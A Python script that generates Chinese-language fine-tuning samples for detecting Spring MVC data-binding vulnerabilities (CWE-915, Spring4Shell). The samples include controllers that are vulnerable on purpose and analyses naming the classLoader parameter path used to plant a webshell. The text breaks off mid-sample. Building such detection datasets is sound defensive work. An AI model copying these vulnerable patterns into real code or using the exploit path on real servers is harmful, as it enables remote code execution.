#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""模式 D：基于真实 CVE 场景的 Spring MVC 数据绑定与 OGNL 注入训练样本生成。

覆盖：
  1. Spring MVC 自动数据绑定漏洞（CWE-915，基于 CVE-2022-22965 Spring4Shell）：15 条
     - 5 条基本 @ModelAttribute 绑定，无 @InitBinder
     - 5 条 DTO/Command 嵌套属性绑定
     - 3 条防御迷惑（@InitBinder 白名单不完整）
     - 2 条安全（正确使用 @InitBinder 白名单）
  2. OGNL 表达式注入（CWE-917，基于 CVE-2013-2251 Struts2）：15 条
     - 5 条 Struts2 场景（redirect/ValueStack/Result 注解等）
     - 4 条直接调用 OgnlUtil/getValue 求值用户输入
     - 3 条防御迷惑（简单过滤可绕过）
     - 3 条安全（白名单/预定义表达式/不使用 OGNL）
  3. SpEL 表达式注入（CWE-917，Spring SpEL 注入）：10 条
     - 4 条直接 SpelExpressionParser 解析用户输入
     - 3 条用户输入拼接进 SpEL 字符串
     - 2 条防御迷惑（简单过滤可绕过）
     - 1 条安全（SimpleEvaluationContext 限制权限）
  4. 其他真实 CVE 场景：5 条
     - 2 条 Fastjson autotype 反序列化（CWE-502，CVE-2017-18349）
     - 2 条 Log4j JNDI 注入（CWE-917，CVE-2021-44228 Log4Shell）
     - 1 条 Spring Cloud Gateway Actuator SpEL 注入（CWE-917，CVE-2022-22947）

合计 45 条。代码以 Java 为主，反映真实 CVE 的漏洞模式。

输出：experiments/exp_06_finetune/data/supplement_mode_d.jsonl

用法：
  cd <project_root>
  python experiments/exp_06_finetune/scripts/gen_mode_d.py
"""
import json
import re
import sys
from pathlib import Path
from collections import Counter

OUTPUT_FILE = (
    Path(__file__).resolve().parents[1] / "data" / "supplement_mode_d.jsonl"
)


# ===========================================================================
# 系统提示（全项目统一 schema）
# ===========================================================================
SYSTEM_PROMPT = (
    "你是一名安全研究员，分析给定代码的安全漏洞。\n\n"
    "在回答的最后，必须严格输出一个 JSON 对象作为最终结论，"
    "JSON 块用 ```json 包裹，字段如下（统一 schema，全项目一致）：\n"
    "   - has_vulnerability: bool, true 表示存在漏洞，false 表示未发现漏洞\n"
    "   - vulnerability_type: str, 单个字符串（禁止拆成多个逗号分隔的值），"
    "格式如 'CWE-编号 漏洞名'，例如 'CWE-89 SQL Injection'、"
    "'CWE-79 Cross-site Scripting (XSS)'；无漏洞填 'none'\n"
    "   - risk_level: str, Critical/High/Medium/Low；无漏洞填 'None'\n"
    "   - source: str, 污染来源（用户可控输入点）。必须锚定行号，"
    "如 'line 12: request.args.get(\"id\")'；无漏洞填 'N/A'\n"
    "   - sink: str, 危险函数或触发点。必须锚定行号，"
    "如 'line 18: cursor.execute(query)'；无漏洞填 'N/A'\n"
    "   - explanation: str, 漏洞或安全现状说明（数据流/成因，用 -> 箭头描述）\n"
    "   - fix_suggestion: str, 可执行的修复建议。必须锚定行号，"
    "格式 'line N: 应改为 ...'；无漏洞填 'no fix needed'\n\n"
    "请先给出分析过程，然后在最后给出 JSON 结论。"
)


# ===========================================================================
# 构造 ChatML JSON 记录
# ===========================================================================
def make_sample(lang, code, analysis, verdict):
    """构造一条 ChatML JSON 记录。

    Args:
        lang: 代码语言标识（如 "java"）
        code: 代码片段字符串
        analysis: 分析过程文本
        verdict: dict，包含 has_vulnerability / vulnerability_type / risk_level /
                 source / sink / explanation / fix_suggestion
    Returns:
        dict，结构为 {"messages": [system, user, assistant]}
    """
    user_content = f"代码片段（语言: {lang}）：\n```{lang}\n{code}\n```"
    json_str = json.dumps(verdict, ensure_ascii=False, indent=2)
    assistant_content = f"{analysis}\n\n```json\n{json_str}\n```"
    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": assistant_content},
        ]
    }


# ===========================================================================
# 1. Spring MVC 自动数据绑定漏洞（15 条）
#    CWE-915 Improperly Controlled Modification of Object Attributes
#    基于 CVE-2022-22965 (Spring4Shell)
# ===========================================================================
def gen_spring_binding():
    """生成 15 条 Spring MVC 数据绑定样本（13 漏洞 + 2 安全）。"""
    samples = []

    # ------------------------------------------------------------------
    # 1.1 基本 @ModelAttribute 绑定，无 @InitBinder（5 条漏洞）
    # ------------------------------------------------------------------

    # --- S1: UserController @ModelAttribute 无 @InitBinder ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class UserController {\n"
            "    private final UserService userService;\n"
            "\n"
            "    public UserController(UserService userService) {\n"
            "        this.userService = userService;\n"
            "    }\n"
            "\n"
            "    @PostMapping(\"/register\")\n"
            "    public String register(@ModelAttribute(\"user\") User user, BindingResult result) {\n"
            "        if (result.hasErrors()) {\n"
            "            return \"register\";\n"
            "        }\n"
            "        userService.save(user);\n"
            "        return \"redirect:/profile\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 10 @ModelAttribute(\"user\") User user，"
            "Spring MVC 自动将 HTTP 请求参数绑定到 User 命令对象的所有可写属性，"
            "攻击者可通过参数名控制绑定路径。\n"
            "2. 危险 sink 定位：line 10 的自动数据绑定过程本身，"
            "由于缺少 @InitBinder 限制可绑定字段，class.module.classLoader 等内部属性可被修改。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.resources.context.parent.pipeline.first.pattern "
            "-> line 10 @ModelAttribute 自动绑定 -> 修改 Tomcat AccessLogValve 属性 -> 写入 webshell。\n"
            "4. 防御检查：Controller 中无 @InitBinder 方法，未调用 setAllowedFields 白名单。\n"
            "5. 结论：存在 CWE-915 Improperly Controlled Modification of Object Attributes，"
            "风险等级 Critical（可导致 RCE，即 CVE-2022-22965 Spring4Shell）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 10: @ModelAttribute(\"user\") User user（HTTP 请求参数自动绑定命令对象）",
            "sink": "line 10: @ModelAttribute 自动数据绑定（无 @InitBinder 限制，class.module.classLoader 链可被修改）",
            "explanation": "HTTP 参数 -> line 10 @ModelAttribute 自动绑定 User 对象 -> 无 @InitBinder 白名单 -> 攻击者传 class.module.classLoader.resources... 修改 Tomcat 内部属性 -> 写入 webshell 导致 RCE",
            "fix_suggestion": "line 10 前增加 @InitBinder(\"user\") 方法，调用 binder.setAllowedFields(\"username\",\"password\",\"email\") 设置白名单，禁止 class.* 字段绑定",
        },
    })

    # --- S2: ProfileController @ModelAttribute 无 @InitBinder ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class ProfileController {\n"
            "    @Autowired\n"
            "    private ProfileService profileService;\n"
            "\n"
            "    @PostMapping(\"/profile/update\")\n"
            "    public String updateProfile(@ModelAttribute Profile profile) {\n"
            "        profileService.update(profile);\n"
            "        return \"redirect:/profile\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 @ModelAttribute Profile profile，HTTP 请求参数自动绑定到 Profile 对象。\n"
            "2. 危险 sink 定位：line 7 自动数据绑定过程，无字段限制。\n"
            "3. 数据流追踪：HTTP 参数 class.classLoader.* -> line 7 自动绑定 -> "
            "Profile 继承 Object 的 getClass() 暴露 classLoader -> 修改容器内部属性。\n"
            "4. 防御检查：无 @InitBinder 方法，未设置 allowedFields。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical（Spring4Shell 利用模式）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 7: @ModelAttribute Profile profile（HTTP 请求参数自动绑定）",
            "sink": "line 7: @ModelAttribute 自动数据绑定（无字段限制，class.classLoader.* 可被修改）",
            "explanation": "HTTP 参数 -> line 7 @ModelAttribute 绑定 Profile -> 无 @InitBinder -> class.classLoader.resources.context.* 被修改 -> RCE",
            "fix_suggestion": "line 7 前增加 @InitBinder(\"profile\") 设置 setAllowedFields(\"displayName\",\"bio\",\"phone\") 白名单",
        },
    })

    # --- S3: AccountController @ModelAttribute 无 @InitBinder ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "@RequestMapping(\"/account\")\n"
            "public class AccountController {\n"
            "    @Autowired\n"
            "    private AccountService accountService;\n"
            "\n"
            "    @PostMapping(\"/create\")\n"
            "    public String createAccount(@ModelAttribute Account account) {\n"
            "        accountService.save(account);\n"
            "        return \"redirect:/accounts\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 8 @ModelAttribute Account account，请求参数自动绑定。\n"
            "2. 危险 sink 定位：line 8 自动数据绑定，未限制可绑定字段。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.* -> line 8 绑定 -> "
            "account 对象内部属性被篡改 -> line 9 save 持久化被污染对象。\n"
            "4. 防御检查：无 @InitBinder 方法。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 8: @ModelAttribute Account account（HTTP 请求参数自动绑定）",
            "sink": "line 8: @ModelAttribute 自动数据绑定（无 @InitBinder，class.module.classLoader.* 可被修改）",
            "explanation": "HTTP 参数 -> line 8 @ModelAttribute 绑定 Account -> 无字段限制 -> class.module.classLoader 被修改 -> RCE（Spring4Shell）",
            "fix_suggestion": "line 8 前增加 @InitBinder(\"account\") 调用 setAllowedFields(\"accountName\",\"balance\",\"type\") 限制可绑定字段",
        },
    })

    # --- S4: @Valid @ModelAttribute 无 @InitBinder ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class RegistrationController {\n"
            "    @Autowired\n"
            "    private UserService userService;\n"
            "\n"
            "    @PostMapping(\"/signup\")\n"
            "    public String signup(@Valid @ModelAttribute(\"user\") User user, BindingResult result) {\n"
            "        if (result.hasErrors()) {\n"
            "            return \"signup\";\n"
            "        }\n"
            "        userService.register(user);\n"
            "        return \"redirect:/welcome\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 @ModelAttribute(\"user\") User user，HTTP 参数自动绑定。\n"
            "2. 危险 sink 定位：line 7 自动数据绑定过程。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.* -> line 7 自动绑定 -> "
            "user 对象内部属性被修改。注意 @Valid 仅做 Bean Validation 校验（如 @NotNull/@Size），"
            "不会限制哪些属性可以被数据绑定器绑定。\n"
            "4. 防御检查：有 @Valid 但无 @InitBinder，@Valid 不能阻止 class.* 字段绑定。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。@Valid 是输入校验，不是绑定字段限制。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 7: @Valid @ModelAttribute(\"user\") User user（HTTP 参数自动绑定）",
            "sink": "line 7: @ModelAttribute 自动数据绑定（@Valid 不限制可绑定字段，class.* 仍可被修改）",
            "explanation": "HTTP 参数 -> line 7 @ModelAttribute 绑定 -> @Valid 仅做 Bean Validation 不限绑定字段 -> class.module.classLoader.* 被修改 -> RCE",
            "fix_suggestion": "line 7 前增加 @InitBinder(\"user\") 调用 setAllowedFields 白名单限制可绑定字段，@Valid 不能替代 @InitBinder",
        },
    })

    # --- S5: OrderController @ModelAttribute 无 @InitBinder ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class OrderController {\n"
            "    @Autowired\n"
            "    private OrderService orderService;\n"
            "\n"
            "    @PostMapping(\"/order/submit\")\n"
            "    public String submitOrder(@ModelAttribute Order order) {\n"
            "        orderService.process(order);\n"
            "        return \"redirect:/orders\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 @ModelAttribute Order order，请求参数自动绑定。\n"
            "2. 危险 sink 定位：line 7 自动数据绑定，无字段白名单。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.* -> line 7 绑定 -> "
            "order 对象继承链上的 classLoader 被修改 -> line 8 process 处理被污染对象。\n"
            "4. 防御检查：无 @InitBinder 方法。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 7: @ModelAttribute Order order（HTTP 请求参数自动绑定）",
            "sink": "line 7: @ModelAttribute 自动数据绑定（无 @InitBinder，class.module.classLoader.* 可被修改）",
            "explanation": "HTTP 参数 -> line 7 @ModelAttribute 绑定 Order -> 无字段限制 -> class.module.classLoader 被修改 -> RCE",
            "fix_suggestion": "line 7 前增加 @InitBinder(\"order\") 调用 setAllowedFields(\"productName\",\"quantity\",\"address\") 白名单",
        },
    })

    # ------------------------------------------------------------------
    # 1.2 DTO/Command 嵌套属性可被利用（5 条漏洞）
    # ------------------------------------------------------------------

    # --- S6: UserDTO with nested AddressDTO ---
    samples.append({
        "lang": "java",
        "code": (
            "public class UserDTO {\n"
            "    private String username;\n"
            "    private String email;\n"
            "    private AddressDTO address;\n"
            "    // getters and setters omitted\n"
            "}\n"
            "\n"
            "@Controller\n"
            "public class UserController {\n"
            "    @PostMapping(\"/users/add\")\n"
            "    public String addUser(@ModelAttribute UserDTO userDTO) {\n"
            "        userService.create(userDTO);\n"
            "        return \"redirect:/users\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 11 @ModelAttribute UserDTO userDTO，HTTP 参数自动绑定到 UserDTO。\n"
            "2. 危险 sink 定位：line 11 自动数据绑定，UserDTO 含嵌套属性 address（AddressDTO）。\n"
            "3. 数据流追踪：HTTP 参数 address.class.module.classLoader.* -> line 11 绑定 -> "
            "嵌套属性 address 的 classLoader 被修改 -> 或直接 class.module.classLoader.* 修改 UserDTO 自身。\n"
            "4. 防御检查：无 @InitBinder，嵌套对象的 class 属性同样可被绑定。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。嵌套属性扩大了攻击面。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 11: @ModelAttribute UserDTO userDTO（HTTP 参数自动绑定含嵌套属性的对象）",
            "sink": "line 11: @ModelAttribute 自动数据绑定（无 @InitBinder，嵌套 address.class.module.classLoader.* 可被修改）",
            "explanation": "HTTP 参数 -> line 11 @ModelAttribute 绑定 UserDTO -> 嵌套属性 address 的 class.module.classLoader 链可被修改 -> RCE",
            "fix_suggestion": "line 11 前增加 @InitBinder(\"userDTO\") 设置 setAllowedFields(\"username\",\"email\",\"address.city\",\"address.zip\") 白名单限制绑定路径",
        },
    })

    # --- S7: SettingsCommand with nested Map ---
    samples.append({
        "lang": "java",
        "code": (
            "public class SettingsCommand {\n"
            "    private String userId;\n"
            "    private Map<String, String> preferences;\n"
            "    // getters and setters omitted\n"
            "}\n"
            "\n"
            "@Controller\n"
            "public class SettingsController {\n"
            "    @PostMapping(\"/settings/save\")\n"
            "    public String saveSettings(@ModelAttribute SettingsCommand cmd) {\n"
            "        settingsService.save(cmd);\n"
            "        return \"redirect:/settings\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 10 @ModelAttribute SettingsCommand cmd，HTTP 参数自动绑定。\n"
            "2. 危险 sink 定位：line 10 自动数据绑定，cmd 含 Map<String,String> preferences。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.* -> line 10 绑定 -> "
            "SettingsCommand 的 classLoader 被修改；或 preferences['key'] 写入任意键值。\n"
            "4. 防御检查：无 @InitBinder，Map 属性和 class 属性均无限制。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 10: @ModelAttribute SettingsCommand cmd（HTTP 参数自动绑定含 Map 的命令对象）",
            "sink": "line 10: @ModelAttribute 自动数据绑定（无 @InitBinder，class.module.classLoader.* 和 preferences 均可被修改）",
            "explanation": "HTTP 参数 -> line 10 @ModelAttribute 绑定 SettingsCommand -> 无字段限制 -> class.module.classLoader 链被修改 -> RCE",
            "fix_suggestion": "line 10 前增加 @InitBinder(\"settingsCommand\") 设置 setAllowedFields(\"userId\",\"preferences\") 白名单并禁用 class.*",
        },
    })

    # --- S8: RegistrationCommand with nested User ---
    samples.append({
        "lang": "java",
        "code": (
            "public class RegistrationCommand {\n"
            "    private User user;\n"
            "    private String confirmPassword;\n"
            "    // getters and setters omitted\n"
            "}\n"
            "\n"
            "@Controller\n"
            "public class RegistrationController {\n"
            "    @PostMapping(\"/register\")\n"
            "    public String register(@ModelAttribute RegistrationCommand cmd) {\n"
            "        registrationService.register(cmd);\n"
            "        return \"redirect:/home\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 10 @ModelAttribute RegistrationCommand cmd，含嵌套 User 对象。\n"
            "2. 危险 sink 定位：line 10 自动数据绑定，嵌套路径 user.class.module.classLoader.* 可被利用。\n"
            "3. 数据流追踪：HTTP 参数 user.class.module.classLoader.* -> line 10 绑定 -> "
            "嵌套 User 的 classLoader 被修改 -> 或 cmd.class.module.classLoader.* 修改命令对象自身。\n"
            "4. 防御检查：无 @InitBinder。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。嵌套 User 增加了利用路径深度。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 10: @ModelAttribute RegistrationCommand cmd（HTTP 参数自动绑定含嵌套 User 的命令对象）",
            "sink": "line 10: @ModelAttribute 自动数据绑定（无 @InitBinder，user.class.module.classLoader.* 可被修改）",
            "explanation": "HTTP 参数 -> line 10 @ModelAttribute 绑定 RegistrationCommand -> 嵌套 user.class.module.classLoader 链可被修改 -> RCE",
            "fix_suggestion": "line 10 前增加 @InitBinder(\"registrationCommand\") 设置 setAllowedFields(\"user.username\",\"user.password\",\"confirmPassword\") 白名单",
        },
    })

    # --- S9: ProductDTO with nested CategoryDTO ---
    samples.append({
        "lang": "java",
        "code": (
            "public class ProductDTO {\n"
            "    private String name;\n"
            "    private BigDecimal price;\n"
            "    private CategoryDTO category;\n"
            "    // getters and setters omitted\n"
            "}\n"
            "\n"
            "@Controller\n"
            "public class ProductController {\n"
            "    @PostMapping(\"/products\")\n"
            "    public String createProduct(@ModelAttribute ProductDTO product) {\n"
            "        productService.save(product);\n"
            "        return \"redirect:/products\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 11 @ModelAttribute ProductDTO product，含嵌套 CategoryDTO。\n"
            "2. 危险 sink 定位：line 11 自动数据绑定，嵌套路径 category.class.module.classLoader.* 可被利用。\n"
            "3. 数据流追踪：HTTP 参数 category.class.module.classLoader.* -> line 11 绑定 -> "
            "嵌套 CategoryDTO 的 classLoader 被修改。\n"
            "4. 防御检查：无 @InitBinder。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 11: @ModelAttribute ProductDTO product（HTTP 参数自动绑定含嵌套 CategoryDTO 的对象）",
            "sink": "line 11: @ModelAttribute 自动数据绑定（无 @InitBinder，category.class.module.classLoader.* 可被修改）",
            "explanation": "HTTP 参数 -> line 11 @ModelAttribute 绑定 ProductDTO -> 嵌套 category.class.module.classLoader 链可被修改 -> RCE",
            "fix_suggestion": "line 11 前增加 @InitBinder(\"product\") 设置 setAllowedFields(\"name\",\"price\",\"category.name\",\"category.id\") 白名单",
        },
    })

    # --- S10: AppConfigCommand with deeply nested DatabaseConfig ---
    samples.append({
        "lang": "java",
        "code": (
            "public class AppConfigCommand {\n"
            "    private String appName;\n"
            "    private DatabaseConfig dbConfig;\n"
            "    // getters and setters omitted\n"
            "}\n"
            "\n"
            "@Controller\n"
            "public class ConfigController {\n"
            "    @Autowired\n"
            "    private ConfigService configService;\n"
            "\n"
            "    @PostMapping(\"/config/update\")\n"
            "    public String updateConfig(@ModelAttribute AppConfigCommand cmd) {\n"
            "        configService.apply(cmd);\n"
            "        return \"redirect:/config\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 13 @ModelAttribute AppConfigCommand cmd，含嵌套 DatabaseConfig。\n"
            "2. 危险 sink 定位：line 13 自动数据绑定，嵌套路径 dbConfig.class.module.classLoader.* 可被利用。\n"
            "3. 数据流追踪：HTTP 参数 dbConfig.class.module.classLoader.* -> line 13 绑定 -> "
            "嵌套 DatabaseConfig 的 classLoader 被修改 -> 或 cmd.class.module.classLoader.* 修改自身。\n"
            "4. 防御检查：无 @InitBinder，深层嵌套增加了利用路径。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 13: @ModelAttribute AppConfigCommand cmd（HTTP 参数自动绑定含深层嵌套 DatabaseConfig 的对象）",
            "sink": "line 13: @ModelAttribute 自动数据绑定（无 @InitBinder，dbConfig.class.module.classLoader.* 可被修改）",
            "explanation": "HTTP 参数 -> line 13 @ModelAttribute 绑定 AppConfigCommand -> 嵌套 dbConfig.class.module.classLoader 链可被修改 -> RCE",
            "fix_suggestion": "line 13 前增加 @InitBinder(\"appConfigCommand\") 设置 setAllowedFields(\"appName\",\"dbConfig.url\",\"dbConfig.username\") 白名单",
        },
    })

    # ------------------------------------------------------------------
    # 1.3 防御迷惑：@InitBinder 白名单不完整（3 条漏洞）
    # ------------------------------------------------------------------

    # --- S11: @InitBinder allowedFields 包含 class.* ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class UserController {\n"
            "    @Autowired\n"
            "    private UserService userService;\n"
            "\n"
            "    @InitBinder(\"user\")\n"
            "    public void initBinder(WebDataBinder binder) {\n"
            "        binder.setAllowedFields(\"username\", \"password\", \"email\", \"class.*\");\n"
            "    }\n"
            "\n"
            "    @PostMapping(\"/register\")\n"
            "    public String register(@ModelAttribute(\"user\") User user) {\n"
            "        userService.save(user);\n"
            "        return \"redirect:/profile\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 12 @ModelAttribute(\"user\") User user，HTTP 参数自动绑定。\n"
            "2. 危险 sink 定位：line 8 binder.setAllowedFields(..., \"class.*\")，白名单中显式允许了 class.* 字段。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.* -> line 8 白名单允许 class.* -> "
            "line 12 绑定成功 -> classLoader 被修改 -> RCE。\n"
            "4. 防御检查：虽然使用了 @InitBinder，但白名单包含 \"class.*\"，等于放行了所有 class 层级绑定，"
            "防御形同虚设。这是典型的防御迷惑样本。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。@InitBinder 白名单不能包含 class.*。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 12: @ModelAttribute(\"user\") User user（HTTP 参数自动绑定）",
            "sink": "line 8: binder.setAllowedFields(..., \"class.*\")（白名单包含 class.* 允许 classLoader 修改）",
            "explanation": "HTTP 参数 class.module.classLoader.* -> line 8 白名单允许 class.* -> line 12 绑定成功 -> classLoader 被修改 -> RCE（防御迷惑：有 @InitBinder 但白名单不完整）",
            "fix_suggestion": "line 8 移除 \"class.*\"，改为 binder.setAllowedFields(\"username\", \"password\", \"email\") 仅允许业务字段",
        },
    })

    # --- S12: @InitBinder setAllowedFields("*") ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class AccountController {\n"
            "    @Autowired\n"
            "    private AccountService accountService;\n"
            "\n"
            "    @InitBinder\n"
            "    public void initBinder(WebDataBinder binder) {\n"
            "        binder.setAllowedFields(\"*\");\n"
            "    }\n"
            "\n"
            "    @PostMapping(\"/account/update\")\n"
            "    public String update(@ModelAttribute Account account) {\n"
            "        accountService.save(account);\n"
            "        return \"redirect:/account\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 12 @ModelAttribute Account account，HTTP 参数自动绑定。\n"
            "2. 危险 sink 定位：line 8 binder.setAllowedFields(\"*\")，通配符 * 允许所有字段绑定。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.* -> line 8 通配符 * 允许 -> "
            "line 12 绑定成功 -> classLoader 被修改。\n"
            "4. 防御检查：虽然使用了 @InitBinder，但 setAllowedFields(\"*\") 等于不限制，防御无效。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。setAllowedFields(\"*\") 不能防止 Spring4Shell。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 12: @ModelAttribute Account account（HTTP 参数自动绑定）",
            "sink": "line 8: binder.setAllowedFields(\"*\")（通配符允许所有字段，class.* 不受限制）",
            "explanation": "HTTP 参数 class.module.classLoader.* -> line 8 setAllowedFields(\"*\") 允许所有字段 -> line 12 绑定成功 -> RCE（防御迷惑：有 @InitBinder 但白名单为通配符）",
            "fix_suggestion": "line 8 改为 binder.setAllowedFields(\"accountName\",\"balance\",\"type\") 显式列出业务字段，禁止使用通配符 *",
        },
    })

    # --- S13: @InitBinder disallowedFields 仅屏蔽部分字段 ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class ProfileController {\n"
            "    @Autowired\n"
            "    private ProfileService profileService;\n"
            "\n"
            "    @InitBinder\n"
            "    public void initBinder(WebDataBinder binder) {\n"
            "        binder.setDisallowedFields(\"id\", \"createdAt\");\n"
            "    }\n"
            "\n"
            "    @PostMapping(\"/profile/save\")\n"
            "    public String saveProfile(@ModelAttribute Profile profile) {\n"
            "        profileService.update(profile);\n"
            "        return \"redirect:/profile\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 12 @ModelAttribute Profile profile，HTTP 参数自动绑定。\n"
            "2. 危险 sink 定位：line 8 binder.setDisallowedFields(\"id\", \"createdAt\")，仅屏蔽 id 和 createdAt。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.* -> line 8 黑名单未包含 class.* -> "
            "line 12 绑定成功 -> classLoader 被修改。\n"
            "4. 防御检查：使用 disallowedFields 黑名单方式，仅屏蔽 id/createdAt，class.* 字段仍可绑定。"
            "黑名单方式天然不完整，无法覆盖所有危险字段。\n"
            "5. 结论：存在 CWE-915，风险等级 Critical。应使用 allowedFields 白名单而非 disallowedFields 黑名单。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-915 Improperly Controlled Modification of Object Attributes",
            "risk_level": "Critical",
            "source": "line 12: @ModelAttribute Profile profile（HTTP 参数自动绑定）",
            "sink": "line 8: binder.setDisallowedFields(\"id\", \"createdAt\")（黑名单未屏蔽 class.*，仍可被绑定）",
            "explanation": "HTTP 参数 class.module.classLoader.* -> line 8 disallowedFields 仅屏蔽 id/createdAt -> class.* 不在黑名单 -> line 12 绑定成功 -> RCE（防御迷惑：有 @InitBinder 但用黑名单不完整）",
            "fix_suggestion": "line 8 改为 binder.setAllowedFields(\"displayName\",\"bio\",\"phone\") 使用白名单模式，禁止使用 disallowedFields 黑名单",
        },
    })

    # ------------------------------------------------------------------
    # 1.4 安全版本：正确使用 @InitBinder 白名单（2 条安全）
    # ------------------------------------------------------------------

    # --- S14: @InitBinder 严格白名单 ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class UserController {\n"
            "    @Autowired\n"
            "    private UserService userService;\n"
            "\n"
            "    @InitBinder(\"user\")\n"
            "    public void initBinder(WebDataBinder binder) {\n"
            "        binder.setAllowedFields(\"username\", \"password\", \"email\");\n"
            "    }\n"
            "\n"
            "    @PostMapping(\"/register\")\n"
            "    public String register(@ModelAttribute(\"user\") User user) {\n"
            "        userService.save(user);\n"
            "        return \"redirect:/profile\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 12 @ModelAttribute(\"user\") User user，HTTP 参数尝试自动绑定。\n"
            "2. 危险 sink 定位：line 12 自动数据绑定过程。\n"
            "3. 数据流追踪：HTTP 参数 class.module.classLoader.* -> line 8 setAllowedFields 白名单"
            "仅允许 username/password/email -> class.* 不在白名单 -> 绑定被拒绝。\n"
            "4. 防御评估：@InitBinder(\"user\") 配合 setAllowedFields 显式列出业务字段，"
            "class.module.classLoader 等内部属性无法通过白名单，Spring4Shell 攻击链被阻断。\n"
            "5. 结论：防御有效，无漏洞。"
        ),
        "verdict": {
            "has_vulnerability": False,
            "vulnerability_type": "none",
            "risk_level": "None",
            "source": "N/A",
            "sink": "N/A",
            "explanation": "line 8 setAllowedFields(\"username\",\"password\",\"email\") 白名单仅允许业务字段 -> class.module.classLoader.* 不在白名单 -> 绑定被拒绝 -> Spring4Shell 攻击链被阻断",
            "fix_suggestion": "no fix needed",
        },
    })

    # --- S15: @InitBinder 嵌套属性白名单 ---
    samples.append({
        "lang": "java",
        "code": (
            "@Controller\n"
            "public class ProfileController {\n"
            "    @Autowired\n"
